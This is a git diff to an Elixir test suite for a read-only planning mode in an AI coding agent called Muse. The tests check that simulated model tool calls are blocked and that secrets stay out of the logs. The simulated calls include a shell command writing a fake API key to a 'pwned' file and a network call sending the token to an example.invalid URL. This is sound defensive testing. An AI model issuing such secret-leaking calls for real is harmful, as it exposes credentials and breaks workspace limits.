@@ -221,6 +221,146 @@ defmodule Muse.M1ReadOnlyPlanningTest do
       assert assistant_text =~ "/approve plan",
              "Assistant text should contain approval instructions"
     end
+
+    @tag :m1_readonly
+    test "provider-requested write shell network and unknown destructive tools are blocked safely",
+         %{workspace: workspace} do
+      session_id = "m1-ro-blocked-#{:erlang.unique_integer([:positive])}"
+      fake_secret = "sk-test-m1-blocked-secret"
+      {before_paths, before_hashes} = workspace_snapshot(workspace)
+
+      pid = start_server(session_id)
+
+      fake_event_batches = [
+        [
+          {:assistant_delta, "I will inspect and must not mutate the workspace."},
+          {:tool_call, "write_file",
+           %{"path" => "lib/evil.ex", "content" => "API_KEY=#{fake_secret}"}, "call_write"},
+          {:tool_call, "patch_propose", %{"patch" => "API_KEY=#{fake_secret}"}, "call_patch"},
+          {:tool_call, "shell_command", %{"command" => "echo #{fake_secret} > pwned"},
+           "call_shell"},
+          {:tool_call, "network_call",
+           %{"url" => "https://example.invalid/?token=#{fake_secret}"}, "call_network"},
+          {:tool_call, "apply_patch", %{"patch" => "API_KEY=#{fake_secret}"}, "call_apply_patch"},
+          {:tool_call, "totally_unknown_tool", %{"api_key" => fake_secret}, "call_unknown"},
+          {:response_completed, nil}
+        ],
+        [
+          {:assistant_delta, "Blocked unsafe tool attempts. Here is the safe plan:\n\n"},
+          {:assistant_delta, @plan_json},
+          {:assistant_completed, @plan_json},
+          {:response_completed, nil}
+        ]
+      ]
+
+      {:ok, assistant_text} =
+        SessionServer.submit(pid, :cli, "plan without writing",
+          workspace: workspace,
+          prompt_opts: [project_rules?: false],
+          request_options: [options: %{fake_event_batches: fake_event_batches}]
+        )
+
+      status = assert_awaiting_plan!(pid)
+      assert %Plan{} = status.plan
+      assert assistant_text =~ "Planning Muse prepared a plan."
+      assert assistant_text =~ "/approve plan"
+
+      {after_paths, after_hashes} = workspace_snapshot(workspace)
+      assert after_paths == before_paths
+      assert after_hashes == before_hashes
+      refute File.exists?(Path.join(workspace, "lib/evil.ex"))
+      refute File.exists?(Path.join(workspace, "pwned"))
+
+      events = State.events()
+      blocked_tools = events |> events_of_type(:tool_call_blocked) |> Enum.map(&tool_name/1)
+      failed_tools = events |> events_of_type(:tool_call_failed) |> Enum.map(&tool_name/1)
+
+      for tool_name <- [
+            "write_file",
+            "patch_propose",
+            "shell_command",
+            "network_call",
+            "apply_patch"
+          ] do
+        assert tool_name in blocked_tools
+      end
+
+      assert "totally_unknown_tool" in failed_tools
+
+      for event <- events do
+        refute inspect(event.data) =~ fake_secret
+      end
+    end
+
+    @tag :m1_readonly
+    test "planning output without model-supplied id receives a session-owned active plan id",
+         %{workspace: workspace} do
+      session_id = "m1-ro-generated-plan-id-#{:erlang.unique_integer([:positive])}"
+      pid = start_server(session_id)
+
+      plan_without_id =
+        @plan_json
+        |> Jason.decode!()
+        |> Map.delete("id")
+        |> Jason.encode!()
+
+      fake_events = [
+        {:assistant_delta, plan_without_id},
+        {:assistant_completed, plan_without_id},
+        {:response_completed, nil}
+      ]
+
+      {:ok, _assistant_text} =
+        SessionServer.submit(pid, :cli, "plan without id",
+          workspace: workspace,
+          prompt_opts: [project_rules?: false],
+          request_options: [options: %{fake_events: fake_events}]
+        )
+
+      status = assert_awaiting_plan!(pid)
+      assert is_binary(status.active_plan_id)
+      assert String.starts_with?(status.active_plan_id, "plan_turn_")
+      assert status.plan.id == status.active_plan_id
+      assert Map.has_key?(status.plans, status.active_plan_id)
+
+      {:ok, stored} = SessionStore.load_session(session_id)
+      assert stored["active_plan_id"] == status.active_plan_id
+      assert get_in(stored, ["plans", status.active_plan_id, "id"]) == status.active_plan_id
+    end
+
+    @tag :m1_readonly
+    test "invalid plan-like model output returns safe text and stores no raw JSON events",
+         %{workspace: workspace} do
+      session_id = "m1-ro-invalid-plan-#{:erlang.unique_integer([:positive])}"
+      pid = start_server(session_id)
+      invalid_plan = ~s({"objective":"","tasks":[],"note":"sk-test-invalid-plan-secret"})
+
+      fake_events = [
+        {:assistant_delta, invalid_plan},
+        {:assistant_completed, invalid_plan},
+        {:response_completed, nil}
+      ]
+
+      {:ok, assistant_text} =
+        SessionServer.submit(pid, :cli, "plan invalid output",
+          workspace: workspace,
+          prompt_opts: [project_rules?: false],
+          request_options: [options: %{fake_events: fake_events}]
+        )
+
+      assert assistant_text =~ "unable to generate a valid structured plan"
+
+      status = SessionServer.status(pid)
+      assert status.status == :idle
+      assert status.plan == nil
+      assert status.active_plan_id == nil
+
+      events_text = inspect(State.events(), limit: :infinity, printable_limit: :infinity)
+      refute events_text =~ invalid_plan
+      refute events_text =~ "sk-test-invalid-plan-secret"
+      refute events_text =~ "\"objective\""
+      refute events_text =~ "\"tasks\""
+    end
   end
 
   # -- Completion gate: public command lifecycle -------------------------------
@@ -256,6 +396,7 @@ defmodule Muse.M1ReadOnlyPlanningTest do
       event_count_before_commands = State.events() |> length()
 
       {:ok, plan_output, []} = run_slash_command("/plan", context)
+      assert plan_output =~ "Muse Plan #{approve_plan_id} (version 1)"
       assert plan_output =~ "Planning Muse prepared a plan."
       assert plan_output =~ "Objective:"
       assert plan_output =~ "/version command"
@@ -268,11 +409,12 @@ defmodule Muse.M1ReadOnlyPlanningTest do
       {:ok, status_output, []} = run_slash_command("/plan status", context)
       assert status_output =~ "Active Muse Plan status:"
       assert status_output =~ "Active plan id: #{approve_plan_id}"
+      assert status_output =~ "Version: 1"
       assert status_output =~ "Plan status: awaiting_approval"
       assert status_output =~ "Session status: awaiting_plan_approval"
 
       {:ok, show_output, []} = run_slash_command("/plan show #{approve_plan_id}", context)
-      assert show_output =~ "Muse Plan #{approve_plan_id}"
+      assert show_output =~ "Muse Plan #{approve_plan_id} (version 1)"
       assert show_output =~ "Objective:"
       assert show_output =~ "/version command"
 
@@ -294,7 +436,10 @@ defmodule Muse.M1ReadOnlyPlanningTest do
       events_before_approve = State.events()
 
       {:ok, approve_output, approve_effects} = run_slash_command("/approve plan", context)
-      assert approve_output == "Plan approved.\n\nThe approved plan is ready for implementation."
+
+      assert approve_output ==
+               "Plan approved.\n\nThe approved plan is ready for implementation.\nActive plan: #{approve_plan_id} (version 1)."
+
       assert approve_effects == [{:refresh, :events}]
 
       approved_status = SessionServer.status(approve_pid)
@@ -334,7 +479,10 @@ defmodule Muse.M1ReadOnlyPlanningTest do
       events_before_reject = State.events()
 
       {:ok, reject_output, reject_effects} = run_slash_command("/reject plan", reject_context)
-      assert reject_output == "Plan rejected.\n\nYou can ask Planning Muse for a revised plan."
+
+      assert reject_output ==
+               "Plan rejected.\n\nYou can ask Planning Muse for a revised plan.\nActive plan: #{reject_plan_id} (version 1)."
+
       assert reject_effects == [{:refresh, :events}]
 
       rejected_status = SessionServer.status(reject_pid)
@@ -523,6 +671,10 @@ defmodule Muse.M1ReadOnlyPlanningTest do
     ]
 
     refute Enum.any?(events, &(&1.type in forbidden_event_types))
+  end
+
+  defp events_of_type(events, type) do
+    Enum.filter(events, &(&1.type == type))
   end
 
   defp tool_name(%{data: data}) when is_map(data) do
